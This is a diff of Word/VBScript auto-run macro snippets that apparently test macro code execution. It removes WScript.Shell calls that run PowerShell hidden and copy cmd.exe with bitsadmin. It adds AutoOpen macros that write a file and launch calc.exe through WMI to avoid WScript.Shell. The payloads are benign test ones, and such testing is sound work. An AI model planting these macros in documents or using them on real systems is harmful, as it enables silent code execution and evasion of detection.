@@ -1,29 +1,10 @@
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell.exe", 1, false
-
-<script>
-    var shell = new ActiveXObject("WScript.Shell");
-    shell.Run("powershell.exe");
-</script>
-
-
-
 Sub AutoOpen()
-    MsgBox "Macros are enabled"
+    Open "C:\Users\Public\macro_test_result.txt" For Output As #1
+    Print #1, "Word macro ran successfully without using WScript.Shell"
+    Close #1
 End Sub
 
 
 Sub AutoOpen()
-    Dim shell As Object
-    Set shell = CreateObject("WScript.Shell")
-    shell.Run "powershell -WindowStyle Hidden -Command whoami > C:\Users\Public\whoami.txt"
-End Sub
-
-
-Sub AutoOpen()
-    Dim s As Object
-    Set s = CreateObject("WScript.Shell")
-    s.Run "bitsadmin /create whoami_job"
-    s.Run "bitsadmin /addfile whoami_job C:\Windows\System32\cmd.exe C:\Users\Public\testcmd.exe"
-    s.Run "bitsadmin /complete whoami_job"
+    GetObject("winmgmts:root\cimv2:Win32_Process").Create "calc.exe"
 End Sub
